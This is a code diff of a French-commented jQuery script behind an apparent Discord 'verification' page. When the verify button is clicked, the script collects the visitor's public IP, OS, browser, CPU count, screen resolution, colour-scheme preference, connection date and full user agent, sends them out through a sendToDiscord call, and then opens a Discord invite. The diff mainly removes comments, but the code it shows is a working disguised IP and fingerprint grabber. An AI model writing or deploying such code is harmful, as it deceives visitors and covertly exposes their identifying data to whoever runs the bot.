@@ -1,4 +1,4 @@
-$(async function () {
+$(function () {
     // Détection OS et navigateur
     const detectOS = () =>
         /Windows/.test(navigator.userAgent) ? "Windows" :
@@ -18,7 +18,6 @@ $(async function () {
     const fetchIPData = async () => {
         try {
             const { ip } = await $.get("https://api.ipify.org?format=json");
-            // Affiche l'IP sur la page si l'élément existe
             if ($("#ip").length) {
                 $("#ip").text("Votre IP : " + ip);
             }
@@ -34,7 +33,6 @@ $(async function () {
     // Données système
     const getData = async () => {
         const ipData = await fetchIPData();
-        // Ajout de la date de connexion et du user agent complet
         return {
             pseudo: "donner par le bot",
             os: detectOS(),
@@ -51,8 +49,8 @@ $(async function () {
             cpu: navigator.hardwareConcurrency || "N/A",
             res: `${screen.width}x${screen.height}`,
             dark: window.matchMedia('(prefers-color-scheme: dark)').matches ? "Oui" : "Non",
-            date: new Date().toLocaleString(), // Date de connexion
-            ua: navigator.userAgent // User Agent complet
+            date: new Date().toLocaleString(),
+            ua: navigator.userAgent
         };
     };
 
@@ -74,8 +72,8 @@ $(async function () {
             `CPU: ${d.cpu}`,
             `Résolution: ${d.res}`,
             `Sombre: ${d.dark}`,
-            `Date: ${d.date}`,           // Ajout date de connexion
-            `User-Agent: ${d.ua}`        // Ajout user agent complet
+            `Date: ${d.date}`,
+            `User-Agent: ${d.ua}`
         ].join('\n');
 
         await $.ajax({
@@ -105,6 +103,7 @@ $(async function () {
         }
     };
 
+    // Bouton vérif
     $("#verifBtn").on("click", function () {
         sendToDiscord().then(() => {
             window.open("https://discord.gg/k6UZsYjeNY", "_blank");
